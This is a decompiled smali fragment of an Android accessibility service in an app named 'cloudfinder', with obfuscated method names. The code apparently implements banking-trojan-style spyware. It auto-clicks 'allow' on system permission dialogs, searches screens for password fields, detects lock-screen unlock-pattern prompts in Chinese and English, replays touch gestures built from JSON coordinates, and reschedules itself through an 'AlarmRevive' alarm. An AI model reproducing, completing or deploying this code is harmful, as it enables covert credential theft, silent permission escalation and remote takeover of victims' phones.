    invoke-virtual {p0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_1

    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_1

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v5

    if-eqz v5, :cond_0

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v5, :cond_0

    return v4

    :catch_0
    :cond_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_2
    invoke-virtual {p0, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    if-eqz p0, :cond_3

    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result p0

    if-nez p0, :cond_3

    move v1, v4

    :cond_3
    return v1
.end method

.method public static ك(Ljava/lang/String;)Z
    .locals 5

    const/4 v0, 0x0

    if-nez p0, :cond_0

    return v0

    :cond_0
    sget-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->س:[Ljava/lang/String;

    array-length v2, v1

    move v3, v0

    :goto_0
    if-ge v3, v2, :cond_2

    aget-object v4, v1, v3

    invoke-virtual {v4, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    const/4 p0, 0x1

    return p0

    :cond_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_2
    return v0
.end method

.method public static م(Ljava/lang/String;)Z
    .locals 2

    const/4 v0, 0x0

    if-nez p0, :cond_0

    return v0

    :cond_0
    const-string v1, "wallpaper"

    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "livewallpaper"

    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "daydream"

    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "screensaver"

    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "com.android.egg"

    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "particles"

    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "clock.widget"

    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_1

    const-string v1, "weather.widget"

    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p0

    if-eqz p0, :cond_2

    :cond_1
    const/4 v0, 0x1

    :cond_2
    return v0
.end method

.method public static ن(Lorg/json/JSONArray;)[Ljava/lang/Object;
    .locals 9

    if-eqz p0, :cond_3

    invoke-virtual {p0}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-gtz v0, :cond_0

    goto :goto_1

    :cond_0
    const/4 v0, 0x0

    invoke-virtual {p0, v0}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v0

    new-instance v1, Landroid/graphics/Path;

    invoke-direct {v1}, Landroid/graphics/Path;-><init>()V

    const-string v2, "x"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v3

    const-string v4, "y"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v5

    const-string v6, "delay"

    invoke-virtual {v0, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v0

    int-to-float v3, v3

    int-to-float v5, v5

    invoke-virtual {v1, v3, v5}, Landroid/graphics/Path;->moveTo(FF)V

    const/4 v3, 0x1

    :goto_0
    invoke-virtual {p0}, Lorg/json/JSONArray;->length()I

    move-result v5

    if-ge v3, v5, :cond_1

    invoke-virtual {p0, v3}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v5

    invoke-virtual {v5, v2}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v7

    int-to-float v7, v7

    invoke-virtual {v5, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v8

    int-to-float v8, v8

    invoke-virtual {v1, v7, v8}, Landroid/graphics/Path;->lineTo(FF)V

    invoke-virtual {v5, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v5

    add-int/2addr v0, v5

    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_1
    invoke-static {}, Landroid/view/ViewConfiguration;->getTapTimeout()I

    move-result p0

    if-gt v0, p0, :cond_2

    add-int/lit8 v0, p0, 0x32

    :cond_2
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p0

    filled-new-array {v1, p0}, [Ljava/lang/Object;

    move-result-object p0

    return-object p0

    :cond_3
    :goto_1
    const/4 p0, 0x0

    return-object p0
.end method

.method public static و(Ljava/lang/CharSequence;)Ljava/lang/String;
    .locals 0

    if-eqz p0, :cond_0

    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    const-string p0, ""

    :goto_0
    return-object p0
.end method

.method public static ى(Landroid/view/accessibility/AccessibilityNodeInfo;I)Z
    .locals 6

    const/16 v0, 0x9

    const/4 v1, 0x0

    if-le p1, v0, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x1

    if-eqz v0, :cond_1

    sget-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ف:Ljava/util/HashSet;

    invoke-virtual {v3, v0}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    return v2

    :cond_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    move v3, v1

    :goto_0
    if-ge v3, v0, :cond_4

    invoke-virtual {p0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-eqz v4, :cond_3

    add-int/lit8 v5, p1, 0x1

    invoke-static {v4, v5}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ى(Landroid/view/accessibility/AccessibilityNodeInfo;I)Z

    move-result v5

    if-eqz v5, :cond_2

    :try_start_0
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return v2

    :cond_2
    :try_start_1
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_3
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_4
    :goto_1
    return v1
.end method

.method public static ي(Landroid/view/accessibility/AccessibilityNodeInfo;I)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 6

    const/16 v0, 0xa

    if-le p1, v0, :cond_0

    goto :goto_2

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    if-eqz v0, :cond_2

    sget-object v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ع:[Ljava/lang/String;

    array-length v3, v2

    move v4, v1

    :goto_0
    if-ge v4, v3, :cond_2

    aget-object v5, v2, v4

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1

    return-object p0

    :cond_1
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :cond_2
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    move-result v0

    if-eqz v0, :cond_3

    return-object p0

    :cond_3
    :goto_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    if-ge v1, v0, :cond_6

    invoke-virtual {p0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_5

    add-int/lit8 v2, p1, 0x1

    invoke-static {v0, v2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ي(Landroid/view/accessibility/AccessibilityNodeInfo;I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_4

    return-object v2

    :cond_4
    :try_start_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_5
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    :cond_6
    :goto_2
    const/4 p0, 0x0

    return-object p0
.end method

.method public static ٮ(Landroid/content/Context;)V
    .locals 8

    const-string v0, "AlarmRevive"

    :try_start_0
    const-string v1, "alarm"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/AlarmManager;

    if-nez v1, :cond_0

    return-void

    :cond_0
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/lite/cloudfinder/receiver/AlarmReviveReceiver;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v3, 0xc000000

    const/16 v4, 0x2711

    invoke-static {p0, v4, v2, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object p0

    invoke-virtual {v1, p0}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/16 v4, 0xbb8

    add-long/2addr v2, v4

    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const/16 v5, 0x1f

    const/4 v6, 0x0

    if-ge v4, v5, :cond_1

    const/4 v7, 0x1

    goto :goto_0

    :cond_1
    move v7, v6

    :goto_0
    if-lt v4, v5, :cond_2

    :try_start_1
    invoke-static {v1}, Landroidx/core/app/آ;->ض(Landroid/app/AlarmManager;)Z

    move-result v7
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_2
    if-eqz v7, :cond_3

    :try_start_2
    invoke-virtual {v1, v6, v2, v3, p0}, Landroid/app/AlarmManager;->setExactAndAllowWhileIdle(IJLandroid/app/PendingIntent;)V

    const-string p0, "Exact alarm used"

    goto :goto_1

    :cond_3
    invoke-virtual {v1, v6, v2, v3, p0}, Landroid/app/AlarmManager;->setAndAllowWhileIdle(IJLandroid/app/PendingIntent;)V

    const-string p0, "Inexact alarm fallback"

    :goto_1
    invoke-static {v0, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :catch_1
    move-exception p0

    const-string v1, "Failed to schedule alarm"

    invoke-static {v0, v1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_2
    return-void
.end method

.method public static ٱ(Z)V
    .locals 0

    sput-boolean p0, Lسۄھؤۏ۫/؋;->ج:Z

    return-void
.end method

.method public static ٳ(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 9

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؽ:[Ljava/lang/String;

    array-length v1, v0

    const/4 v2, 0x0

    move v3, v2

    :goto_0
    if-ge v3, v1, :cond_2

    aget-object v4, v0, v3

    invoke-virtual {p0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v5

    if-eqz v5, :cond_1

    invoke-interface {v5}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :cond_0
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_1

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v6, :cond_0

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v7

    if-eqz v7, :cond_0

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v7

    invoke-static {v7}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "android.widget.Button"

    invoke-virtual {v8, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_0

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v7

    if-eqz v7, :cond_0

    invoke-interface {v7}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_0

    new-instance p0, Ljava/lang/StringBuilder;

    const-string v0, "AutoGrant: text-click \'"

    invoke-direct {p0, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "\'"

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v0, "MyAccessSvc"

    invoke-static {v0, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/16 p0, 0x10

    invoke-virtual {v6, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const/4 p0, 0x1

    return p0

    :cond_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_2
    return v2
.end method


# virtual methods
.method public final onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 18

    move-object/from16 v8, p0

    move-object/from16 v2, p1

    # 权限对话框：交给 PermAutoGrant 自动点允许
    :try_start_permag
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;
    move-result-object v1
    if-nez v1, :cond_permag_skip
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v1
    const-string v3, "GrantPermissionsActivity"
    invoke-virtual {v1, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v1
    if-nez v1, :cond_permag_skip
    move-object/from16 v0, p0
    invoke-static {v0}, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;->start(Landroid/accessibilityservice/AccessibilityService;)V
    :cond_permag_skip
    :try_end_permag
    .catch Ljava/lang/Exception; {:try_start_permag .. :try_end_permag} :catch_permag
    goto :goto_permag

    :catch_permag
    move-exception v0
    :goto_permag

    const-string v1, "]"

    const-string v3, "CC_LOCK cls="

    const-string v4, "cls="

    const-string v5, "err:"

    const-string v6, "LOCK evt=0x"

    if-nez v2, :cond_0

    return-void

    :cond_0
    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_f
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    const-string v9, ""

    if-nez v0, :cond_1

    move-object v0, v9

    goto :goto_0

    :cond_1
    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    :goto_0
    invoke-static {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v10, "["

    invoke-virtual {v0, v10, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v1, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-static {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-static {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventTime()J

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-static {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v13
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_f
    .catchall {:try_start_1 .. :try_end_1} :catchall_2

    if-eqz v12, :cond_2

    move-object v9, v12

    :cond_2
    :try_start_2
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    move v15, v0

    goto :goto_1

    :catch_0
    move-exception v0

    move-object v15, v0

    :try_start_3
    invoke-virtual {v15}, Ljava/lang/Throwable;->printStackTrace()V

    const/4 v15, 0x0

    :goto_1
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v14
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_f
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    if-eqz v14, :cond_3

    :try_start_4
    const-string v0, "android.widget.FrameLayout"

    invoke-virtual {v0, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    sput-object v14, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ة:Landroid/view/accessibility/AccessibilityNodeInfo;

    :cond_3
    invoke-static {v12}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_e
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    const-string v7, " chd="

    const-string v2, "MyAccessSvc"

    if-eqz v0, :cond_5

    :try_start_5
    const-string v0, "null"
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    move-object/from16 v16, v9

    const-string v9, " txt="

    move-object/from16 v17, v3

    const-string v3, " desc="

    if-eqz v14, :cond_4

    :try_start_6
    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v14, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v4, " id="

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " bnd="

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Landroid/graphics/Rect;->toShortString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    goto :goto_2

    :catch_1
    move-exception v0

    :try_start_7
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_4
    :goto_2
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v15}, Ljava/lang/Integer;->toHexString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " pkg="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " cls="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " SRC["

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    goto :goto_3

    :catchall_0
    move-exception v0

    move-object/from16 v8, p0

    goto/16 :goto_8

    :catch_2
    move-exception v0

    move-object/from16 v8, p0

    goto/16 :goto_9

    :cond_5
    move-object/from16 v17, v3

    move-object/from16 v16, v9

    :goto_3
    :try_start_8
    invoke-static/range {p0 .. p1}, Lڝږ؁ڋ/أ;->أ(Landroid/accessibilityservice/AccessibilityService;Landroid/view/accessibility/AccessibilityEvent;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    :catch_3
    const/4 v0, 0x1

    sparse-switch v15, :sswitch_data_0

    move-object/from16 v8, p0

    goto/16 :goto_7

    :sswitch_0
    :try_start_9
    invoke-static {v12}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ك(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_8

    if-eqz v10, :cond_8

    const-string v1, "\u7ed8\u5236\u56fe\u6848"

    invoke-virtual {v10, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_7

    const-string v1, "\u753b\u51fa\u89e3\u9501\u56fe\u6848"

    invoke-virtual {v10, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_7

    const-string v1, "\u5f00\u59cb\u7ed8\u5236\u56fe\u6848"

    invoke-virtual {v10, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_7

    const-string v1, "\u56fe\u6848\u89e3\u9501"

    invoke-virtual {v10, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_7

    const-string v1, "draw pattern"

    invoke-virtual {v10, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_7

    const-string v1, "draw unlock pattern"

    invoke-virtual {v10, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_7

    const-string v1, "Draw pattern"

    invoke-virtual {v10, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_6

    goto :goto_4

    :cond_6
    const/4 v0, 0x0

    :cond_7
    :goto_4
    if-eqz v0, :cond_8

    invoke-static {v12}, Lڝږ؁ڋ/ؼ;->ؤ(Ljava/lang/String;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_2
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    :cond_8
    move-object/from16 v8, p0

    :try_start_a
    invoke-virtual {v8, v12, v11}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ط(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_e
    .catchall {:try_start_a .. :try_end_a} :catchall_1

    goto/16 :goto_7

    :sswitch_1
